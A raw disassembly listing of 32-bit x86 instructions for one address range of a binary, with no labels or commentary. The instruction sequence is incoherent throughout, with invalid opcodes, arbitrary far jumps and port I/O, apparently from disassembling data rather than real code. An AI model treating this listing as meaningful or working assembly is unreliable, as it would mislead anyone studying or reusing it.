  41b30e:	fstp   DWORD PTR [edx+0x4712e7e2]
  41b314:	fidiv  WORD PTR [esp+esi*1]
  41b317:	mov    cl,0x5
  41b319:	sahf   
  41b31a:	pop    esp
  41b31b:	and    bl,BYTE PTR [eax+0x54]
  41b31e:	push   ecx
  41b31f:	inc    ebp
  41b320:	cmp    eax,0xa7de86b2
  41b325:	pop    ss
  41b326:	mov    edi,0x1dfd60b6
  41b32b:	fstp   QWORD PTR [edi]
  41b32d:	loop   0x41b2d2
  41b32f:	aam    0x5f
  41b331:	pop    ebp
  41b332:	mov    edx,0xef46d96b
  41b337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b338:	xor    BYTE PTR ds:0x24bc2f61,ch
  41b33e:	mov    dh,0x16
  41b340:	(bad)  
  41b341:	int    0xda
  41b343:	sub    ebp,esi
  41b345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b346:	mov    ebp,DWORD PTR [ecx-0x398db8b4]
  41b34c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b34d:	fist   WORD PTR [edi-0x38cde6eb]
  41b353:	pushf  
  41b354:	scas   eax,DWORD PTR es:[edi]
  41b355:	gs gs cmp ax,0xf85d
  41b35b:	pop    es
  41b35c:	pop    ebx
  41b35d:	push   es
  41b35e:	sbb    ch,bl
  41b360:	or     ecx,edi
  41b362:	cmp    eax,0x21acfe49
  41b367:	dec    edx
  41b368:	aaa    
  41b369:	aaa    
  41b36a:	xchg   ebp,eax
  41b36b:	pusha  
  41b36c:	cmc    
  41b36d:	xchg   ecx,eax
  41b36e:	mov    BYTE PTR [ebp-0x18],cl
  41b371:	xchg   BYTE PTR [eax+0x26],bh
  41b374:	(bad)  [eax+0x4f]
  41b377:	jmp    DWORD PTR [ecx+0x54]
  41b37a:	cwde   
  41b37b:	xchg   ebx,eax
  41b37c:	and    al,0xaf
  41b37e:	cli    
  41b37f:	mov    ecx,0xe995cdda
  41b384:	inc    esi
  41b385:	jecxz  0x41b32f
  41b387:	xchg   ebx,eax
  41b388:	idiv   bl
  41b38a:	mov    bl,0x54
  41b38c:	aad    0x7c
  41b38e:	or     eax,0x65d4c81e
  41b393:	mov    eax,0xf4e43dc
  41b398:	or     al,0x56
  41b39a:	pop    edi
  41b39b:	lods   eax,DWORD PTR ds:[esi]
  41b39c:	enter  0xd80f,0x4c
  41b3a0:	jmp    0x3ede3e4c
  41b3a5:	sbb    ah,al
  41b3a7:	aas    
  41b3a8:	imul   ecx,DWORD PTR [ebx+0x6f],0xffffffa9
  41b3ac:	icebp  
  41b3ad:	and    BYTE PTR [esi+edi*8],cl
  41b3b0:	pop    ss
  41b3b1:	test   BYTE PTR [edx],dh
  41b3b3:	mov    esi,DWORD PTR [edx+0x7ba93318]
  41b3b9:	aaa    
  41b3ba:	out    0x4a,al
  41b3bc:	aam    0xa6
  41b3be:	pop    edi
  41b3bf:	mov    al,ds:0xa6585ed5
  41b3c4:	xchg   esi,eax
  41b3c5:	fild   WORD PTR [ebx+ecx*1+0x1b]
  41b3c9:	repnz push edi
  41b3cb:	mov    eax,0x38cf3fde
  41b3d0:	sets   BYTE PTR [esi+0x77299a6e]
  41b3d7:	inc    esp
  41b3d8:	mov    cl,0x37
  41b3da:	fs out dx,eax
  41b3dc:	fimul  DWORD PTR [edx-0x4a]
  41b3df:	arpl   WORD PTR [edi],di
  41b3e1:	mov    ah,0xab
  41b3e3:	adc    ah,BYTE PTR [edi+0x12]
  41b3e6:	inc    edi
  41b3e7:	push   es
  41b3e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3e9:	ja     0x41b421
  41b3eb:	adc    ah,BYTE PTR [edx+0x719eb486]
  41b3f1:	(bad)
  41b3f4:	mov    ds:0xd7c7d06e,eax
  41b3f9:	xlat   BYTE PTR ds:[ebx]
  41b3fa:	push   0x3c287924
  41b3ff:	pusha  
  41b400:	sbb    al,0xaf
  41b402:	adc    esp,ebp
  41b404:	bound  ebx,QWORD PTR [ecx-0x5ca4bfc3]
  41b40a:	out    dx,al
  41b40b:	cld    
  41b40c:	fisttp DWORD PTR [eax]
  41b40e:	adc    dl,BYTE PTR [edx]
  41b410:	call   FWORD PTR [esi+0x27]
  41b413:	mov    ds:0x37af626,eax
  41b418:	gs mov esp,0xa83a9aa4
  41b41e:	rol    BYTE PTR [ebp+0x12],cl
  41b421:	aas    
  41b422:	scas   eax,DWORD PTR es:[edi]
  41b423:	mov    ecx,0xc5c185be
  41b428:	inc    edx
  41b429:	dec    esp
  41b42a:	push   0xffffff90
  41b42c:	push   0x28
  41b42e:	mov    al,0xb3
  41b430:	push   ss
  41b431:	push   ecx
  41b432:	call   0xbfc5:0xec1ed980
  41b439:	fstp   TBYTE PTR [ebx-0x28f062e5]
  41b43f:	mov    ecx,0xe6c81233
  41b444:	dec    esi
  41b445:	out    dx,eax
  41b446:	fistp  QWORD PTR [ebx+0x67517a5e]
  41b44c:	or     ecx,esi
  41b44e:	test   DWORD PTR [eax+0x3b0c7bbb],ecx
  41b454:	pop    esp
  41b455:	sub    edi,DWORD PTR [eax]
  41b457:	adc    al,0x34
  41b459:	cmp    DWORD PTR [ecx-0x69daa4ae],ebp
  41b45f:	cs out 0x55,al
  41b462:	dec    eax
  41b463:	imul   ebp,DWORD PTR [edi+0x1ff32d51],0xa5627f3d
  41b46d:	call   0x1d804667
  41b472:	ins    DWORD PTR es:[edi],dx
  41b473:	out    dx,eax
  41b474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b475:	mov    bl,0xd
  41b477:	fidiv  DWORD PTR ds:[esi]
  41b47a:	pop    esp
  41b47b:	mov    es,esi
  41b47d:	test   DWORD PTR [ebx],eax
  41b47f:	aas    
  41b480:	push   es
  41b481:	pop    ss
  41b482:	sbb    bh,bl
  41b484:	dec    ecx
  41b485:	fsubr  DWORD PTR [edi+0x7bf15dac]
  41b48b:	mov    dl,0xae
  41b48d:	adc    al,0x8
  41b48f:	add    dl,BYTE PTR [ecx]
  41b491:	popa   
  41b492:	fsub   QWORD PTR gs:[eax+0x2b]
  41b496:	or     BYTE PTR [eax-0x1c5379d5],al
  41b49c:	jl     0x41b510
  41b49e:	adc    eax,edi
  41b4a0:	push   0x68e1541f
  41b4a5:	xor    al,0xa5
  41b4a7:	aaa    
  41b4a8:	leave  
  41b4a9:	adc    eax,0xf05be425
  41b4ae:	jae    0x41b4e8
  41b4b0:	cdq    
  41b4b1:	scas   eax,DWORD PTR es:[edi]
  41b4b2:	jg     0x41b524
  41b4b4:	or     eax,0x1e88c586
  41b4b9:	jbe    0x41b4b6
  41b4bb:	ss pusha 
  41b4bd:	cmp    DWORD PTR [edi],edx
  41b4bf:	bound  edx,QWORD PTR [esi+0x37e3d9de]
  41b4c5:	shr    BYTE PTR [eax+0x8],0x7a
  41b4c9:	mov    edi,0xce377ce3
  41b4ce:	lock stos DWORD PTR es:[edi],eax
  41b4d0:	cmp    BYTE PTR [ebp-0x15],ah
  41b4d3:	outs   dx,BYTE PTR ds:[esi]
  41b4d4:	push   edi
  41b4d5:	and    cl,BYTE PTR [edx-0x4e6864d0]
  41b4db:	add    edi,DWORD PTR [edx-0x593f1721]
  41b4e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4e2:	and    al,0x3d
  41b4e4:	xlat   BYTE PTR ds:[ebx]
  41b4e5:	mov    ch,0x8c
  41b4e7:	stos   DWORD PTR es:[edi],eax
  41b4e8:	addr16 test ah,cl
  41b4eb:	(bad)  
  41b4ed:	ror    DWORD PTR [edx],cl
  41b4ef:	xchg   esp,eax
  41b4f0:	mov    ebx,0xe34bd3f
  41b4f5:	int    0x8f
  41b4f7:	imul   edx,DWORD PTR [ecx+0x3e0c119e],0xffffff8a
  41b4fe:	mov    dh,0xbc
  41b500:	xchg   esp,eax
  41b501:	dec    edi
  41b502:	iret   
  41b503:	rol    DWORD PTR [ebx+edx*4],0x6d
  41b507:	sub    BYTE PTR [edi-0x63],ah
  41b50a:	push   edx
  41b50b:	test   esi,ebx
  41b50d:	cmp    ebx,DWORD PTR [ebx]
  41b50f:	lock popa 
  41b511:	sub    eax,0x2817d992
  41b516:	(bad)  
  41b517:	xor    eax,ebx
  41b519:	stc    
  41b51a:	fld    TBYTE PTR [eax-0x4f]
  41b51d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b51e:	imul   edi,DWORD PTR [esi],0xffffffc6
  41b521:	les    edi,FWORD PTR ds:0xc1d21f24
  41b527:	adc    DWORD PTR ds:0x85c32fad,esp
  41b52d:	xor    al,0xfc
  41b52f:	pop    ecx
  41b530:	add    eax,0x2fb0f2bf
  41b535:	pop    edi
  41b536:	(bad)  
  41b537:	mov    dl,0x6c
  41b539:	mov    al,0x74
  41b53b:	in     eax,dx
  41b53c:	imul   esp,DWORD PTR [esi-0x5f],0xfffffff3
  41b540:	push   eax
  41b541:	jns    0x41b538
  41b543:	mov    edi,0x231779a
  41b548:	cmp    al,BYTE PTR [edi+0x1e442a6e]
  41b54e:	ins    DWORD PTR es:[edi],dx
  41b54f:	and    ah,BYTE PTR ds:0x65326746
  41b555:	nop
  41b556:	lods   al,BYTE PTR ds:[esi]
  41b557:	xchg   edi,eax
  41b558:	scas   al,BYTE PTR es:[edi]
  41b559:	cmp    cl,BYTE PTR [ecx+0x28138fef]
  41b55f:	stos   BYTE PTR es:[edi],al
  41b560:	test   BYTE PTR gs:[esi+0x2125e223],0xc0
  41b568:	(bad)  
  41b56a:	imul   ebp,DWORD PTR [edx],0x19ae64b4
  41b570:	xchg   esp,eax
  41b571:	dec    ebp
  41b572:	inc    esp
  41b573:	js     0x41b5db
  41b575:	loopne 0x41b508
  41b577:	out    0x88,al
  41b579:	imul   esp,DWORD PTR [edx],0x40
  41b57c:	xor    edx,DWORD PTR [eax-0x65]
  41b57f:	aam    0xf4
  41b581:	jge    0x41b52a
  41b583:	stos   BYTE PTR es:[edi],al
  41b584:	or     eax,0xe3e9bef4
  41b589:	(bad)  
  41b58a:	into   
  41b58b:	or     al,BYTE PTR [ebp-0x4b868ac0]
  41b591:	pop    ss
  41b592:	mov    eax,ds:0x650ddfe9
  41b597:	pop    edx
  41b598:	push   0x175e5ec3
  41b59d:	lahf   
  41b59e:	xor    BYTE PTR [ecx+edx*8-0x7a496e3c],0xba
  41b5a6:	push   esp
  41b5a7:	cli    
  41b5a8:	and    eax,0x523ea93c
  41b5ad:	fwait
  41b5ae:	mov    cl,0xf
  41b5b0:	rcr    BYTE PTR [esi+esi*4],0xb9
  41b5b4:	ret    
  41b5b5:	jmp    0xa182:0xd6dcf53e
  41b5bc:	add    esp,DWORD PTR [edi+0x13371615]
  41b5c2:	jmp    0x79f1:0x123daa29
  41b5c9:	out    dx,eax
  41b5ca:	in     al,0xe4
  41b5cc:	cmp    dh,dl
  41b5ce:	cmp    ecx,DWORD PTR [ebp+0xc]
  41b5d1:	jg     0x41b55e
  41b5d3:	daa    
  41b5d4:	sbb    DWORD PTR [esi-0x2be6411d],0xa
  41b5db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5dc:	sbb    edi,DWORD PTR [ecx+0x1d]
  41b5df:	mov    ds:0x23e9a4de,eax
  41b5e4:	mov    cl,0x6e
  41b5e6:	test   eax,0xd116934
  41b5eb:	fcomp  QWORD PTR [edx-0x61]
  41b5ee:	xchg   esi,eax
  41b5ef:	sub    esi,DWORD PTR [ebx-0x7d]
  41b5f2:	cld    
  41b5f3:	imul   esi,DWORD PTR [edx],0x41
  41b5f6:	add    eax,0x434a225
  41b5fb:	xlat   BYTE PTR ds:[ebx]
  41b5fc:	or     bh,BYTE PTR [edx-0x2f]
  41b5ff:	xor    esi,edi
  41b601:	mov    bh,0x87
  41b603:	push   cs
  41b604:	xor    bl,al
  41b606:	loop   0x41b650
  41b608:	fadd   st(3),st
  41b60a:	push   0x9fe02651
  41b60f:	inc    esp
  41b610:	and    dl,BYTE PTR [ebx-0x6c]
  41b613:	aaa    
  41b614:	pop    ss
  41b615:	push   cs
  41b616:	sub    eax,0x28a36795
  41b61b:	jecxz  0x41b5ee
  41b61d:	test   eax,0xf73d6458
  41b622:	mov    edx,0xb1862c44
  41b627:	push   ebp
  41b628:	mov    eax,0x9805556e
  41b62d:	xchg   ebx,eax
  41b62e:	dec    esp
  41b62f:	sbb    DWORD PTR [edi],0x4e4c2cc9
  41b635:	fisub  WORD PTR [edx]
  41b637:	ss add cl,bh
  41b63a:	in     al,0xf
  41b63c:	leave  
  41b63d:	inc    ebp
  41b63e:	loop   0x41b5ef
  41b640:	out    0x91,al
  41b642:	dec    esp
  41b643:	xchg   ebx,eax
  41b644:	gs mov bh,0x85
  41b647:	inc    edi
  41b648:	(bad)  
  41b649:	(bad)  
  41b64a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b64b:	mov    cl,0x1e
  41b64d:	cmp    ebp,DWORD PTR [eax-0x7cfa93f]
  41b653:	retf   0x1485
  41b656:	mov    ebp,0xe9d80e1a
  41b65b:	mov    bl,0x1c
  41b65d:	retf   0xfbdb
  41b660:	ficomp DWORD PTR [edx+0x2b]
  41b663:	mov    ebp,0x489a2a56
  41b668:	int    0x46
  41b66a:	loopne 0x41b643
  41b66c:	push   edi
  41b66d:	sub    DWORD PTR [ebp+0x7155f17e],esi
  41b673:	xor    BYTE PTR [edi],bl
  41b675:	or     eax,0x6c4a527a
  41b67a:	dec    ecx
  41b67b:	in     eax,dx
  41b67c:	and    eax,0x319dc02c
  41b681:	add    eax,0xa87b336
  41b686:	mov    DWORD PTR [ebp+0x19],esi
  41b689:	jle    0x41b645
  41b68b:	sub    dl,bh
  41b68d:	add    ebx,DWORD PTR [ebx+0x1e]
  41b690:	shr    BYTE PTR ds:0x440eb783,1
  41b696:	sbb    esp,ecx
  41b698:	aaa    
  41b699:	push   esi
  41b69a:	sub    DWORD PTR [esi-0x6c],edx
  41b69d:	shl    BYTE PTR [ecx+edx*1-0x54],0x3b
  41b6a2:	push   0xbe290f46
  41b6a7:	mov    eax,0x42f28815
  41b6ac:	fcomp  DWORD PTR [ebp+ecx*8-0x21]
  41b6b0:	in     eax,dx
  41b6b1:	not    BYTE PTR [esi+0x3b]
  41b6b4:	push   eax
  41b6b5:	loope  0x41b6ee
  41b6b7:	cmp    al,0x22
  41b6b9:	cdq    
  41b6ba:	lahf   
  41b6bb:	mov    ecx,0xa0e42140
  41b6c0:	scas   eax,DWORD PTR es:[edi]
  41b6c1:	cld    
  41b6c2:	ds ins DWORD PTR es:[edi],dx
  41b6c4:	loope  0x41b6a3
  41b6c6:	icebp  
  41b6c7:	cmc    
  41b6c8:	xor    BYTE PTR [ebx-0x4efd9b87],ch
  41b6ce:	int    0x27
  41b6d0:	fs jp  0x41b6b0
  41b6d3:	push   edi
  41b6d4:	les    ebp,FWORD PTR [esi+edx*2-0x6f1ebe33]
  41b6db:	js     0x41b6e9
  41b6dd:	push   0xffffff9f
  41b6df:	cli    
  41b6e0:	push   ecx
  41b6e1:	cmp    bh,dh
  41b6e3:	in     eax,dx
  41b6e4:	mov    dh,0x6d
  41b6e6:	jmp    0x55b8:0x24904930
  41b6ed:	jbe    0x41b6a7
  41b6ef:	jbe    0x41b770
  41b6f1:	imul   edx,DWORD PTR [edx+esi*2],0xffffffd0
  41b6f5:	push   fs
  41b6f7:	ja     0x41b726
  41b6f9:	(bad)  
  41b6fa:	and    DWORD PTR [ecx+0x13],esi
  41b6fd:	leave  
  41b6fe:	mov    dh,0xd8
  41b700:	call   0xbe0da9ad
  41b705:	jle    0x41b69a
  41b707:	test   BYTE PTR [ebx],ch
  41b709:	add    DWORD PTR [esi-0x9d69737],ecx
  41b70f:	je     0x41b6a9
  41b711:	sub    DWORD PTR [esi+0x388039ae],0x5ea118fd
  41b71b:	inc    DWORD PTR [edi-0x687299eb]
  41b721:	pop    esi
  41b722:	adc    ah,BYTE PTR [esi+edi*2-0x784833d7]
  41b729:	in     eax,0x4e
  41b72b:	mov    cl,0x1c
  41b72d:	xchg   DWORD PTR [eax],edi
  41b72f:	cmp    al,bl
  41b731:	cmc    
  41b732:	unpckhps xmm2,xmm1
  41b735:	mov    cl,0x57
  41b737:	test   al,0x7c
  41b739:	mov    esp,0xc30ac869
  41b73e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b73f:	mov    edx,0x42b8277e
  41b744:	sar    BYTE PTR [eax+edi*8],cl
  41b747:	outs   dx,DWORD PTR ds:[esi]
  41b748:	push   ebp
  41b749:	out    0xd4,al
  41b74b:	aad    0xba
  41b74d:	xchg   ebp,eax
  41b74e:	repz sbb eax,0xa2bc7029
  41b754:	adc    BYTE PTR [esi-0x4ff7915a],cl
  41b75a:	int3   
  41b75b:	xor    eax,DWORD PTR [edi]
  41b75d:	adc    BYTE PTR [esi-0x39b19a8b],0x7a
  41b764:	retf   0x2dba
  41b767:	jmp    0x42190072
  41b76c:	xchg   esi,eax
  41b76d:	or     ch,BYTE PTR [esi-0x4abb2ba]
  41b773:	loop   0x41b736
  41b775:	je     0x41b743
  41b777:	daa    
  41b778:	arpl   WORD PTR [ebx+0x79],sp
  41b77b:	push   ebx
  41b77c:	dec    esi
  41b77d:	fldl2e 
  41b77f:	jnp    0x41b7fa
  41b781:	pop    ebp
  41b782:	pushf  
  41b783:	push   edi
  41b784:	repz jge 0x41b7e7
  41b787:	lds    ebp,FWORD PTR [eax+0x6c]
  41b78a:	xchg   edi,eax
  41b78b:	jno    0x41b787
  41b78d:	mov    eax,ds:0x9c07a719
  41b792:	xor    DWORD PTR [si-0x771e],0x43
  41b798:	scas   eax,DWORD PTR es:[edi]
  41b799:	mov    edi,0xdbe076fe
  41b79e:	mov    esp,0xdae5ad05
  41b7a3:	dec    esi
  41b7a4:	mov    edi,0x2f8a66f5
  41b7a9:	mov    ecx,0xd162938d
  41b7ae:	loop   0x41b7b6
  41b7b0:	mov    gs,WORD PTR [edx]
  41b7b2:	fwait
  41b7b3:	add    DWORD PTR [ebx-0x46cd4a1c],ebp
  41b7b9:	in     al,dx
  41b7ba:	fcomp  DWORD PTR [eax+0x1e]
  41b7bd:	adc    dh,bl
  41b7bf:	xchg   edx,eax
  41b7c0:	ins    BYTE PTR es:[edi],dx
  41b7c1:	dec    ebx
  41b7c2:	push   esi
  41b7c3:	inc    esp
  41b7c4:	xor    al,0x92
  41b7c6:	push   ecx
  41b7c7:	sbb    eax,0xfd9ad63c
  41b7cc:	or     DWORD PTR [ebx-0x7ba5ae42],0xbacc5911
  41b7d6:	imul   ebx,DWORD PTR [ebx-0x79],0x1f
  41b7da:	sub    eax,0xbb03abde
  41b7df:	push   esi
  41b7e0:	push   ds
  41b7e1:	mov    edi,0x56cfa477
  41b7e6:	test   DWORD PTR [esp+eax*1-0x576ec45e],0xa72ecca7
  41b7f1:	xor    eax,0x5f0f5fbe
  41b7f6:	inc    ebx
  41b7f7:	xor    al,0x99
  41b7f9:	out    0x66,al
  41b7fb:	fld    DWORD PTR ds:[edx+esi*2+0x64]
  41b800:	loopne 0x41b87e
  41b802:	or     ebx,ebx
  41b804:	add    eax,0x43612755
  41b809:	cmp    dh,cl
  41b80b:	lds    ebx,FWORD PTR [eax-0x3f]
  41b80e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b80f:	dec    ebp
  41b810:	stos   DWORD PTR es:[edi],eax
  41b811:	mov    ebx,0x6dd0e7cc
  41b816:	js     0x41b88e
  41b818:	xor    ah,dh
  41b81a:	lahf   
  41b81b:	xor    DWORD PTR [eax+0x5c],0xb1261aa3
  41b822:	call   0x85ae:0x606235a3
  41b829:	xor    esp,DWORD PTR [eax-0x54]
  41b82c:	ins    DWORD PTR es:[edi],dx
  41b82d:	jle    0x41b880
  41b82f:	cmp    edx,DWORD PTR [ebp+0x4516f072]
  41b835:	les    edx,FWORD PTR [edx]
  41b837:	dec    ecx
  41b838:	fild   DWORD PTR [eax]
  41b83a:	adc    BYTE PTR [edx],0x56
  41b83d:	cmp    eax,DWORD PTR [edx+0x2a]
  41b840:	xor    bl,BYTE PTR [esi]
  41b842:	into   
  41b843:	daa    
  41b844:	inc    esi
  41b845:	xor    BYTE PTR [ebx-0x4f],dh
  41b848:	mov    BYTE PTR [ecx+0x66],cl
  41b84b:	xor    al,0xa3
  41b84d:	mov    ah,0x2b
  41b84f:	sub    ebp,DWORD PTR [edi]
  41b851:	dec    eax
  41b852:	sahf   
  41b853:	pop    es
  41b854:	jge    0x41b81f
  41b856:	jmp    0x208a:0xfb7a1b71
  41b85d:	(bad)  
  41b85e:	(bad)
  41b862:	xor    esp,DWORD PTR [eax]
  41b864:	test   BYTE PTR [edx],dl
  41b866:	cmp    BYTE PTR [eax-0x7f],ah
  41b869:	sub    ecx,edi
  41b86b:	jecxz  0x41b7fc
  41b86d:	lds    ebx,FWORD PTR [eax-0x26cc9683]
  41b873:	pop    ss
  41b874:	cmp    eax,0x8da552e5
  41b879:	sub    al,0xbb
  41b87b:	xchg   BYTE PTR [esi+0x8c9c024],ah
  41b881:	bound  eax,QWORD PTR [ebx]
  41b883:	aad    0x1c
  41b885:	pop    es
  41b886:	stos   DWORD PTR es:[edi],eax
  41b887:	jmp    0x41b843
  41b889:	jne    0x41b8ac
  41b88b:	xor    ecx,DWORD PTR [esi+0x47fa1028]
  41b891:	adc    dl,ch
  41b893:	sbb    eax,DWORD PTR [eax]
  41b895:	pop    ds
  41b896:	mov    dh,0x8a
  41b898:	inc    esp
  41b899:	sbb    ecx,DWORD PTR [esi+0x2cbcbd1d]
  41b89f:	loope  0x41b8f5
  41b8a1:	pop    edx
  41b8a2:	xchg   esp,eax
  41b8a3:	pop    edi
  41b8a4:	and    cl,BYTE PTR [edi-0x490df6c5]
  41b8aa:	rcl    DWORD PTR [edx-0x7e82b7c2],cl
  41b8b0:	mov    BYTE PTR [edx],bl
  41b8b2:	ds test ebp,ebx
  41b8b5:	lahf   
  41b8b6:	fcmovne st,st(7)
  41b8b8:	and    bl,BYTE PTR [ebx-0x15]
  41b8bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8bc:	jl     0x41b915
  41b8be:	xchg   BYTE PTR [edi+ebx*4+0x2bbdaa9],ch
  41b8c5:	mov    WORD PTR [esi+edi*1-0xf4da749],ss
  41b8cc:	mov    ah,0xd6
  41b8ce:	sbb    BYTE PTR [ebp-0x37e1bddb],0xdc
  41b8d5:	sub    esp,DWORD PTR [ebx-0x7f]
  41b8d8:	cs pop eax
  41b8da:	scas   al,BYTE PTR es:[edi]
  41b8db:	je     0x41b88b
  41b8dd:	push   ecx
  41b8de:	fwait
  41b8df:	push   0x3c
  41b8e1:	call   0xdaf6:0x881a21ca
  41b8e8:	pop    ebp
  41b8e9:	and    DWORD PTR [edi+ebx*2+0x32417fda],0x4d
  41b8f1:	into   
  41b8f2:	aas    
  41b8f3:	jmp    0xc438123a
  41b8f8:	cmp    BYTE PTR [edx+0x4bb574a7],0xa1
  41b8ff:	inc    esp
  41b900:	push   ebx
  41b901:	add    BYTE PTR [esi+0xdbe8824],bl
  41b907:	bound  edi,QWORD PTR [ecx]
  41b909:	enter  0x586,0x23
  41b90d:	rol    BYTE PTR [edx],cl
  41b90f:	xchg   ecx,eax
  41b910:	inc    esi
  41b911:	push   ecx
  41b912:	jns    0x41b8a7
  41b914:	sub    al,0xbf
  41b916:	xor    ch,BYTE PTR [eax-0x23]
  41b919:	lahf   
  41b91a:	sbb    eax,0xee638e2c
  41b91f:	(bad)  
  41b920:	int3   
  41b921:	(bad)  
  41b922:	mov    edi,0x8c8fc410
  41b927:	sub    edx,DWORD PTR [edi]
  41b929:	test   DWORD PTR [edx-0x7a],edx
  41b92c:	add    ecx,DWORD PTR [ecx+0x6a0c566f]
  41b932:	test   BYTE PTR [ebp+0xfa35d9c],dh
  41b938:	xor    al,0x6f
  41b93a:	inc    ecx
  41b93b:	sub    al,0x8a
  41b93d:	pop    edx
  41b93e:	ret    
  41b93f:	gs jmp 0x6793:0xfa57a26a
  41b947:	xor    ecx,DWORD PTR [edx-0x332624fe]
  41b94d:	dec    eax
  41b94e:	aad    0xea
  41b950:	cli    
  41b951:	mov    BYTE PTR [ebx+0x5e],cl
  41b954:	int    0xa7
  41b956:	push   ebx
  41b957:	imul   ebp,DWORD PTR [eax-0x1e988c43],0xffffffd9
  41b95e:	push   0xab277f3d
  41b963:	iret   
  41b964:	mov    bh,0xb3
  41b966:	add    al,ah
  41b968:	cs xchg edx,eax
  41b96a:	outs   dx,BYTE PTR ds:[esi]
  41b96b:	fmul   QWORD PTR [ecx]
  41b96d:	in     eax,0x18
  41b96f:	push   ds
  41b970:	cmp    edi,eax
  41b972:	pop    ss
  41b973:	cvtps2pd xmm3,QWORD PTR [esi-0x3eeb74b5]
  41b97a:	js     0x41b96e
  41b97c:	inc    edi
  41b97d:	xor    eax,0xe7de505a
  41b982:	cmp    BYTE PTR [edx+0x47],0x2c
  41b986:	arpl   WORD PTR [edi+esi*4-0x732ce6b0],si
  41b98d:	xchg   esi,eax
  41b98e:	mov    eax,0x2ca0373b
  41b993:	shr    DWORD PTR [edx],1
  41b995:	mov    edx,DWORD PTR [edi-0x10]
  41b998:	call   0x64b9:0x3e335c5a
  41b99f:	mov    ebp,0x6e1e9764
  41b9a4:	shr    al,1
  41b9a6:	sbb    al,0xf4
  41b9a8:	ror    BYTE PTR [edx],1
  41b9aa:	pop    esi
  41b9ab:	rcl    DWORD PTR ds:0x5259da0b,0xed
  41b9b2:	test   BYTE PTR [edi+eiz*8],dl
  41b9b5:	test   BYTE PTR [ebp-0x6f],bh
  41b9b8:	(bad)  es:[ecx+0x3a0b2698]
  41b9bf:	cli    
  41b9c0:	adc    edi,0xadd1c584
  41b9c6:	jmp    0x41b9c0
  41b9c8:	push   ecx
  41b9c9:	mov    ebp,0xd3415635
  41b9ce:	cld    
  41b9cf:	mov    bl,0xd2
  41b9d1:	js     0x41ba4d
  41b9d3:	loop   0x41ba4e
  41b9d5:	sti    
  41b9d6:	add    eax,DWORD PTR [eax]
  41b9d8:	hlt    
  41b9d9:	sub    bh,bl
  41b9db:	push   edi
  41b9dc:	test   DWORD PTR ds:0x18a93af5,edi
  41b9e2:	arpl   WORD PTR [edx],bp
  41b9e4:	sbb    al,0x52
  41b9e6:	dec    ecx
  41b9e7:	or     eax,0xa8c54a89
  41b9ec:	cmp    BYTE PTR [edi+eax*4+0xa],ch
  41b9f0:	xchg   BYTE PTR [edx],ch
  41b9f2:	js     0x41b9ed
  41b9f4:	idiv   al
  41b9f6:	xchg   edi,eax
  41b9f7:	jmp    0x41ba27
  41b9f9:	aam    0xd7
  41b9fb:	cmp    eax,esi
  41b9fd:	jae    0x41b9c2
  41b9ff:	pop    ss
  41ba00:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41ba02:	mov    BYTE PTR [eax+eiz*2],0x97
  41ba06:	or     BYTE PTR [esi-0x18d9ea98],0xdb
  41ba0d:	fisub  WORD PTR [ebp-0xa9c8ae8]
  41ba13:	cdq    
  41ba14:	outs   dx,BYTE PTR ds:[esi]
  41ba15:	push   cs
  41ba16:	outs   dx,DWORD PTR ds:[esi]
  41ba17:	add    DWORD PTR [esp+edi*8],esi
  41ba1a:	das    
  41ba1b:	(bad)  
  41ba1c:	in     eax,dx
  41ba1d:	jb     0x41b9d8
  41ba1f:	push   0xffffff94
  41ba21:	jmp    0x41ba4a
  41ba23:	and    edx,DWORD PTR [edi+0x1]
  41ba26:	xor    ebp,DWORD PTR [edi]
  41ba28:	pop    ecx
  41ba29:	loopne 0x41b9e9
  41ba2b:	inc    edx
  41ba2c:	ss scas eax,DWORD PTR es:[edi]
  41ba2e:	pop    esi
  41ba2f:	and    DWORD PTR [ecx+0x7e],ecx
  41ba32:	or     ah,dh
  41ba34:	dec    ebx
  41ba35:	fcomp  DWORD PTR [ebp+0xd8bed67]
  41ba3b:	sub    ebp,DWORD PTR [esi-0x1e]
  41ba3e:	or     bl,BYTE PTR [ebp+0x26]
  41ba41:	xchg   ecx,eax
  41ba42:	jo     0x41ba21
  41ba44:	mov    ds:0x8f1342df,eax
  41ba49:	push   ecx
  41ba4a:	sbb    bl,BYTE PTR [ebp-0x5d]
  41ba4d:	loopne 0x41b9dd
  41ba4f:	outs   dx,BYTE PTR ds:[esi]
  41ba50:	pop    es
  41ba51:	adc    edx,DWORD PTR ds:0x6a7069a2
  41ba57:	mov    ebp,0x7abf8c47
  41ba5c:	jle    0x41ba01
  41ba5e:	sbb    eax,0xff1ff7fd
  41ba63:	mov    bh,0xd1
  41ba65:	xchg   esp,eax
  41ba66:	ds fwait
  41ba68:	(bad)  
  41ba69:	mov    edi,0x66c5f459
  41ba6e:	pop    ss
  41ba6f:	out    dx,al
  41ba70:	aaa    
  41ba71:	push   ss
  41ba72:	retf   0x52d2
  41ba75:	xchg   edx,eax
  41ba76:	inc    ecx
  41ba77:	shl    DWORD PTR [ebx],0x3d
  41ba7a:	and    BYTE PTR [eax+0x3cfe1e34],bl
  41ba80:	fdiv   QWORD PTR [esi]
  41ba82:	adc    al,0x7e
  41ba84:	ror    BYTE PTR [esi],1
  41ba86:	das    
  41ba87:	popf   
  41ba88:	ret    0x1790
  41ba8b:	push   esi
  41ba8c:	rcr    DWORD PTR [eax+0x60],0x8
  41ba90:	adc    eax,0xd3f0efea
  41ba95:	test   eax,0x8555b564
  41ba9a:	push   cs
  41ba9b:	ret    0x53e3
  41ba9e:	add    DWORD PTR [edi-0x5f0623e6],eax
  41baa4:	ja     0x41ba99
  41baa6:	scas   eax,DWORD PTR es:[edi]
  41baa7:	xor    dh,dl
  41baa9:	jbe    0x41ba73
